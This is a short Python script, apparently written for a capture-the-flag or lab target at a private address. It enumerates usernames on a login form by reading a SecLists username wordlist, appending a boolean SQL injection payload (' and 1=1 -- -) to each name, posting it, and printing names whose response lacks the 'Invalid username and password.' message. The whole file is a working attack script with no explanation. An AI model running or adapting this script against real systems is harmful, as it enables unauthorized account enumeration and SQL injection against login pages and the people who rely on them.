import requests
import urllib.parse
import threading

headers = {
    'Host': '10.10.128.197',
    # 'Content-Length': '21',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'Origin': 'http://10.10.128.197',
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Referer': 'http://10.10.128.197/',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Connection': 'close',
}



with open('/home/splitunknown/Tools/SecLists/Usernames/xato-net-10-million-usernames.txt', 'r') as file:
    line = file.readline()
    while line:
        line = file.readline()
        data = {
        'username': line.strip()+"' and 1=1 -- -",
        'password': 'password',
        }
        encoded=urllib.parse.urlencode(data)
        # print(encoded)
        response = requests.post('http://10.10.128.197/', headers=headers, data=encoded, verify=False)
        if("Invalid username and password." not in response.text):
            print("User name:- "+line)

